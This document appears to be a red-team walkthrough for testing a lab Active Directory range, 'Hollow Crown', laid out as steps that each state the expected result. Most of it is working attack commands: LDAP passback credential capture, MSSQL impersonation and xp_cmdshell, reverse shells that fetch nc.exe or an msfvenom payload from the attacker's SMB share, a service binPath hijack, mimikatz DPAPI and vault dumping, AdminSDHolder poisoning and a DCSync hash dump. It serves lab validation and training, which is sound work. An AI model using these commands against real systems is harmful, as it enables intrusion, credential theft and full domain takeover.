# SCENARIO 4: "HOLLOW CROWN" —  Red Team Testing Guide

## SETUP: Set Your Variables

Run this first on Kali to set all IPs for the session:

```bash
# Set these to your actual IPs
export KALI_IP=<your_kali_ip>
export DC_IP=<dc03_ip>
export WEB_IP=<srv08-web_ip>
export SQL_IP=<srv09-sql_ip>
export DEV_IP=<srv10-dev_ip>
export JUMP_IP=<srv11-jump_ip>

```

---

## STEP 0: RECON

### 0.1 — Find all hosts

```bash
nmap -sn 192.168.x.0/24
```

### 0.2 — Identify services

```bash
# DC (Kerberos)
nmap -p 88 --open 192.168.x.0/24

# Web server
nmap -p 80 --open 192.168.x.0/24

# SQL server
nmap -p 1433 --open 192.168.x.0/24
```

### 0.3 — Full port scan on each host

```bash
nmap -sV -sC -p- $WEB_IP -oN web_scan.txt
nmap -sV -sC -p- $SQL_IP -oN sql_scan.txt
nmap -sV -sC -p- $DEV_IP -oN dev_scan.txt
nmap -sV -sC -p- $JUMP_IP -oN jump_scan.txt
nmap -sV -sC -p- $DC_IP -oN dc_scan.txt
```

### 0.4 — SMB share enumeration (anonymous)

```bash
nxc smb $WEB_IP $SQL_IP $DEV_IP $JUMP_IP $DC_IP --shares -u '' -p ''
```

### 0.5 — Anonymous LDAP enumeration

```bash
nxc ldap $DC_IP -u '' -p '' --users
nxc ldap $DC_IP -u '' -p '' --groups
```

### 0.6 — Web enumeration

```bash
# Check root page
curl -s http://$WEB_IP/

# Check /admin
curl -s http://$WEB_IP/admin/

# Check /docs
curl -s http://$WEB_IP/docs/infrastructure.html

# Check web.config.bak
curl -s http://$WEB_IP/web.config.bak

# Check hidden share
smbclient //$WEB_IP/WebBackups$ -N -c "ls"
```

---

## STEP 1: LDAP PASSBACK — SRV08-WEB

### 1.1 — Start your rogue LDAP listener

**Terminal 1** — pick one of these:

```bash
# Option A: netcat (simplest — you'll see raw data)
sudo nc -nlvp 389
```

```bash
# Option B: responder (cleanest output)
sudo responder -I eth0 -wv
```

### 1.2 — Trigger the passback

Open a browser (or use curl for the login):

1. Go to `http://<WEB_IP>/admin/`
2. Login with `admin` / `admin`
3. On the LDAP Configuration page, change **LDAP Server** to your Kali IP
4. Click **Test Connection**

### 1.3 — Check your listener

You should see the LDAP bind request with cleartext credentials:

```
svc_ldap / Ld@pB1nd#2025!
```

### 1.4 — Verify the captured creds work

```bash
nxc smb $DC_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local
```

Should show `[+]` with a successful auth.

### 1.5 — Enumerate what svc_ldap can access

```bash
# SMB shares
nxc smb $SQL_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local --shares

# Check MSSQL access
nxc mssql $SQL_IP -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local
```

---

## TEST CONTINGENCY C1a: web.config.bak

```bash
curl -s http://$WEB_IP/web.config.bak | grep -i password
```

Should show `Ld@pB1nd#2025!` in the LdapBindPassword value.

## TEST CONTINGENCY C1b: infrastructure.html

```bash
curl -s http://$WEB_IP/docs/infrastructure.html | grep -i "pass"
```

Should show the LDAP bind password.

## TEST CONTINGENCY C1c: WebBackups$ share

```bash
mkdir -p /tmp/webbackups
cd /tmp/webbackups
smbclient //$WEB_IP/WebBackups$ -N -c "prompt OFF; mget *"
cat *
```

Should show the LDAP bind password in the IIS export XML.

---

## TEST SKIP-A: ForceChangePassword (svc_ldap → svc_build)

```bash
# Try resetting svc_build's password using svc_ldap's access
net rpc password svc_build 'TestSkipA!2025' -U "CYBERANGE/svc_ldap%Ld@pB1nd#2025!" -S $DC_IP
```

If it works, verify:

```bash
nxc smb $DC_IP -u svc_build -p 'TestSkipA!2025' -d cyberange.local
```

**IMPORTANT:** If you changed the password, change it back for the rest of the test:

```bash
net rpc password svc_build 'Bu1ld@cc#2025!' -U "CYBERANGE/svc_ldap%Ld@pB1nd#2025!" -S $DC_IP
```

---

## STEP 2: SQL IMPERSONATION — SRV09-SQL

### 2.1 — Connect to MSSQL as svc_ldap

```bash
impacket-mssqlclient 'CYBERANGE/svc_ldap:Ld@pB1nd#2025!@'$SQL_IP -windows-auth
```

### 2.2 — Check IMPERSONATE privilege

In the SQL shell:

```sql
SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

Should show `sa`.

### 2.3 — Impersonate sa

```sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
```

Should show `sa`.

### 2.4 — Enable xp_cmdshell and test

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

Should show `cyberange\svc_dev`.

### 2.5 — Create SQL Agent Job for command execution

```sql
USE msdb;

#Delete the recore if created while testing
EXEC sp_delete_job @job_name = 'TestJob', @delete_unused_schedule = 1;

EXEC sp_add_job @job_name = 'TestJob';
EXEC sp_add_jobstep @job_name = 'TestJob', @step_name = 'run', @subsystem = 'CmdExec', @command = 'cmd /c whoami > C:\Users\Public\whoami.txt && ipconfig >> C:\Users\Public\whoami.txt';
EXEC sp_add_jobserver @job_name = 'TestJob';
EXEC sp_start_job @job_name = 'TestJob';

```

Wait 5 seconds, then read:

```sql
EXEC xp_cmdshell 'type C:\Users\Public\whoami.txt';
```

Should show `cyberange\svc_dev` and the network config.

### 2.6 — Get a reverse shell (optional but proves full chain)

**Terminal 1** on Kali:

```bash
nc -nlvp 4444
```

**Terminal 2** on Kali:

```bash
#Place nc.exe in the /opt/redteam/tools folder

impacket-smbserver share /opt/redteam/tools -smb2support -username att -password att
```

In the SQL shell:

```sql
USE msdb;
EXEC sp_add_job @job_name = 'RevShell';
EXEC sp_add_jobstep @job_name = 'RevShell', @step_name = 'run', @subsystem = 'CmdExec', @command = 'cmd /c net use \\KALI_IP\share /user:att att && \\KALI_IP\share\nc.exe -e cmd KALI_IP 4444';
EXEC sp_add_jobserver @job_name = 'RevShell';
EXEC sp_start_job @job_name = 'RevShell';
```

You should get a shell as `cyberange\svc_dev` on Terminal 1.

### 2.7 — Clean up test jobs

```sql
USE msdb;
EXEC sp_delete_job @job_name = 'TestJob', @delete_unused_schedule = 1;
EXEC sp_delete_job @job_name = 'RevShell', @delete_unused_schedule = 1;
```

---

## TEST SKIP-B: ServiceCredentials Table

While still in the SQL shell:

```sql
USE DevAppDB;
SELECT * FROM dbo.ServiceCredentials;
```

You should see 6 rows. Row 4 has `svc_itadmin` with `1tAdm!nSvc#2025`.

Test it from Kali (new terminal):

```bash
nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local
```

Should show `[+]` — if it does, you could skip Steps 3+4 and go straight to Step 5.

---

## TEST CONTINGENCY C2a: TRUSTWORTHY + db_owner

```sql
-- Revert to svc_ldap context first
REVERT;
SELECT SYSTEM_USER;  -- should show svc_ldap

-- Try TRUSTWORTHY chain
USE DevAppDB;
EXECUTE AS USER = 'dbo';
SELECT SYSTEM_USER;  -- should show 'dbo'

-- This gives you sa-equivalent in DevAppDB context
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

REVERT;
```

## TEST CONTINGENCY C2c: CLR Assembly

```sql
USE DevAppDB;
EXEC dbo.sp_clr_exec 'whoami';
```

Should return `cyberange\svc_dev`.

---

## STEP 3: SERVICE BINARY PATH HIJACK — SRV10-DEV

### 3.1 — Verify svc_dev can query CorpBuildSvc remotely

From the svc_dev reverse shell (Step 2.6), or use nxc:

```bash
# From Kali — test svc_dev creds first
nxc smb $DEV_IP -u svc_dev -p 'D3v$3rv!c3#2025' -d cyberange.local
```

From the shell on SRV09-SQL as svc_dev:

```cmd
evil-winrm -i $DEV_IP  -u svc_dev -p 'D3v$3rv!c3#2025'
```

Should show the service config with `svc_build` as the service account.

### 3.2 — Test the hijack

**Terminal 1** — Kali listener:

```bash
nc -nlvp 4443
```

**Terminal 2** — SMB server with payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI_IP LPORT=4443 -f exe -o /tmp/svc.exe
impacket-smbserver share /tmp/ -smb2support -username att -password att
```

From svc_dev shell on SRV09-SQL:

```cmd
sc.exe stop CorpBuildSvc
sc.exe config CorpBuildSvc binPath= "cmd /c net use \\<KALI_IP>\share /user:att att && \\<KALI_IP>\share\svc.exe"
sc.exe start CorpBuildSvc
```

Terminal 1 should get a shell as `cyberange\svc_build`.

### 3.3 — Read LAPS password as svc_build

From the Shell on SRV10-DEV as svc_build:

```
powershell -c "$s = New-Object DirectoryServices.DirectorySearcher; $s.Filter = '(cn=SRV11-JUMP)'; $s.PropertiesToLoad.Add('ms-Mcs-AdmPwd') | Out-Null; $r = $s.FindOne(); $r.Properties['ms-mcs-admpwd']"
```

From Kali:

```bash
nxc ldap $DC_IP -u svc_build -p 'Bu1ld@cc#2025!' -M laps
```

Should show the LAPS password for SRV11-JUMP.

### 3.4 — Restore CorpBuildSvc (important for re-testing)

From an admin shell on SRV10-DEV:

```powershell
sc.exe config CorpBuildSvc binPath= "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\BuildService\BuildMonitor.ps1 -Service"
```

---

## TEST CONTINGENCY C3a: Unquoted Service Path

From svc_dev shell on SRV10-DEV:

```cmd
wmic service get name,pathname | findstr /v /i "C:\Windows" | findstr /i /v "\""
```

Should show `CorpDevTools` with unquoted path.

Check write access:

```cmd
icacls "C:\Program Files\Corp Dev"
```

Should show `Authenticated Users` with `(M)` Modify.

### TEST CONTINGENCY C3b: NightlyBuildClean

```cmd
schtasks /query /tn "NightlyBuildClean" /fo LIST /v
icacls "C:\BuildService\NightlyClean"
```

Should show task running as svc_build, and Authenticated Users with Modify on the folder.

### TEST CONTINGENCY C3c: AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Should show `0x1`.

---

## STEP 4: LAPS + DPAPI — SRV11-JUMP

### 4.1 — Get the LAPS password

```bash
nxc ldap $DC_IP -u svc_build -p 'Bu1ld@cc#2025!' -M laps
```

Note the password. Set it as a variable:

```bash
export LAPS_PW='<the_password_from_above>'
```

### 4.2 — Authenticate to SRV11-JUMP

```bash
nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth
```

Should show `[+] (Pwn3d!)`.

### 4.3 — Get a shell

```bash
impacket-psexec ./Administrator:"$LAPS_PW"@$JUMP_IP
```

Or:

```bash
impacket-wmiexec ./Administrator:"$LAPS_PW"@$JUMP_IP
```

### 4.4 — Extract DPAPI credentials

**Method 1: nxc --dpapi module (easiest)**

```bash
nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth --dpapi
```

Look for `svc_itadmin` with password `1tAdm!nSvc#2025`.

**Method 2: Manual mimikatz (if nxc dpapi module isn't available)**

Terminal on Kali:

```bash
impacket-smbserver share /opt/redteam/tools -smb2support -username att -password att
```

From shell on SRV11-JUMP:

```cmd
net use \\<KALI_IP>\share /user:att att
copy \\<KALI_IP>\share\mimikatz.exe C:\temp\m.exe
C:\temp\m.exe "privilege::debug" "sekurlsa::dpapi" "exit"
```

Note the master key GUIDs and keys, then:

```cmd
dir C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Credentials\ /a
```

For each blob file:

```cmd
C:\temp\m.exe "dpapi::cred /in:C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Credentials\<BLOB_FILE>" "exit"
```

Or dump all vaults at once:

```cmd
C:\temp\m.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
```

### 4.5 — Verify svc_itadmin creds

```bash
nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local
```

Should show `[+]`.

---

## TEST CONTINGENCY C4a: AutoLogon Registry

```bash
nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth -x "reg query \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\" /v DefaultPassword"
```

Should show `J9m#Kx2v!Wq` for user `CorpAdmin`.

Test it:

```bash
nxc smb $JUMP_IP -u CorpAdmin -p 'J9m#Kx2v!Wq' --local-auth
```

## TEST CONTINGENCY C4b: PSReadline History

```bash
nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth -x "type C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

Should show commands containing `1tAdm!nSvc#2025`.

## TEST CONTINGENCY C4c: Unattend.xml

```bash
nxc smb $JUMP_IP -u Administrator -p "$LAPS_PW" --local-auth -x "type C:\Windows\Panther\Unattend.xml"
```

Should show Base64-encoded password. Decode it:

```bash
echo "<BASE64_VALUE>" | base64 -d | iconv -f UTF-16LE -t UTF-8
```

Strip the trailing `AdministratorPassword` to get the real password.

---

## STEP 5: ADMINSDHOLDER POISONING — DC03

### 5.1 — Sync clock to DC (critical for Kerberos)

```bash
sudo ntpdate $DC_IP
```

Or:

```bash
sudo date -s "$(nmap -p 445 --script smb2-time $DC_IP 2>/dev/null | grep 'date:' | awk '{print $2,$3}')"
```

### 5.2 — Verify svc_itadmin has WriteDACL on AdminSDHolder

```bash
# Using bloodyAD
bloodyAD -d cyberange.local -u svc_itadmin -p '1tAdm!nSvc#2025' --host $DC_IP get writable --detail 2>/dev/null | grep -i adminsdholder
```

Or using impacket dacledit:

```bash
dacledit.py 'cyberange.local/svc_itadmin:1tAdm!nSvc#2025' -dc-ip $DC_IP -target-dn "CN=AdminSDHolder,CN=System,DC=cyberange,DC=local" -action read 2>/dev/null | grep -i svc_itadmin
```

### 5.3 — Add GenericAll ACE on AdminSDHolder

```bash
# Using dacledit (impacket)
dacledit.py 'cyberange.local/svc_itadmin:1tAdm!nSvc#2025' -dc-ip $DC_IP \
    -target-dn "CN=AdminSDHolder,CN=System,DC=cyberange,DC=local" \
    -action write -ace-type full -principal svc_itadmin
```

Or bloodyAD:

```bash
bloodyAD -d cyberange.local -u svc_itadmin -p '1tAdm!nSvc#2025' --host $DC_IP \
    add genericAll 'CN=AdminSDHolder,CN=System,DC=cyberange,DC=local' svc_itadmin
```

### 5.4 — Force SDProp to run (instead of waiting 60 minutes)

From a PowerShell session on DC03 (RDP or WinRM as svc_itadmin, or use admin_backup DA account):

```powershell
# Option A: Invoke SDProp via rootDSE
$rootDSE = [ADSI]"LDAP://RootDSE"
$rootDSE.Put("RunProtectAdminGroupsTask", 1)
$rootDSE.SetInfo()
```

Or from Kali via WinRM (if svc_itadmin has remote management):

```bash
evil-winrm -i $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025'
```

Then in the evil-winrm shell:

```powershell
$rootDSE = [ADSI]"LDAP://RootDSE"
$rootDSE.Put("RunProtectAdminGroupsTask", 1)
$rootDSE.SetInfo()
```

### 5.5 — Add svc_itadmin to Domain Admins

Wait 1-2 minutes after forcing SDProp, then:

```bash
net rpc group addmem "Domain Admins" "svc_itadmin" \
    -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP
```

### 5.6 — Verify Domain Admin

```bash
nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local
```

Should show `(Pwn3d!)`.

```bash
# Check group membership
nxc ldap $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local --groups | grep -i "domain admins"
```

### 5.7 — DCSync (final proof)

```bash
impacket-secretsdump 'CYBERANGE/svc_itadmin:1tAdm!nSvc#2025@'$DC_IP
```

Should dump all domain hashes including `Administrator` and `krbtgt`.

### 5.8 — Test persistence (SDProp re-adds ACE)

From DC03 as admin_backup, remove svc_itadmin from Domain Admins:

```powershell
Remove-ADGroupMember -Identity "Domain Admins" -Members "svc_itadmin" -Confirm:$false
```

Force SDProp again:

```powershell
$rootDSE = [ADSI]"LDAP://RootDSE"
$rootDSE.Put("RunProtectAdminGroupsTask", 1)
$rootDSE.SetInfo()
```

Wait 1-2 minutes, then from Kali try adding self back:

```bash
net rpc group addmem "Domain Admins" "svc_itadmin" \
    -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP
```

Should work because the GenericAll ACE on AdminSDHolder got re-propagated by SDProp.

---

## TEST CONTINGENCY C5a: Backup Operators

```bash
# Add svc_itadmin to Backup Operators
net rpc group addmem "Backup Operators" "svc_itadmin" \
    -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP

# Verify
nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local -x "whoami /groups" | grep -i backup
```

## TEST CONTINGENCY C5b: Writable GPO

```bash
# Check if svc_itadmin can edit the GPO
# Use Get-GPO from a PowerShell session or:
nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local -x "powershell -c \"Get-GPO -Name DC-HealthCheck-Policy\""
```

## SUMMARY: What Each Step Proves

|Step|What You're Testing|Success Criteria|
|---|---|---|
|0|Network visibility|All 5 hosts found, ports identified|
|1|LDAP passback|svc_ldap creds captured in cleartext|
|C1a|web.config.bak leak|Password visible via HTTP|
|C1b|docs page leak|Password visible via HTTP|
|C1c|Hidden share leak|Password in SMB share files|
|SKIP-A|ForceChangePassword ACL|svc_build password reset succeeds|
|2|SQL IMPERSONATE + Agent|xp_cmdshell as svc_dev works|
|C2a|TRUSTWORTHY chain|EXECUTE AS dbo → xp_cmdshell works|
|C2c|CLR assembly|sp_clr_exec returns whoami|
|SKIP-B|Cred table|svc_itadmin password in SELECT results|
|3|Service binPath hijack|Shell as svc_build received|
|C3a|Unquoted path|wmic shows unquoted, icacls shows writable|
|C3b|Writable sched task|Task folder writable by Authenticated Users|
|C3c|AlwaysInstallElevated|Both registry keys = 1|
|4|LAPS read + DPAPI|LAPS password works, svc_itadmin creds extracted|
|C4a|AutoLogon registry|CorpAdmin password in registry|
|C4b|PSReadline history|svc_itadmin password in history file|
|C4c|Unattend.xml|Encoded password decodable|
|5|AdminSDHolder → DA|DCSync succeeds as svc_itadmin|
|C5a|Backup Operators|Group membership added successfully|
|C5b|Writable GPO|GPO editable by svc_itadmin|
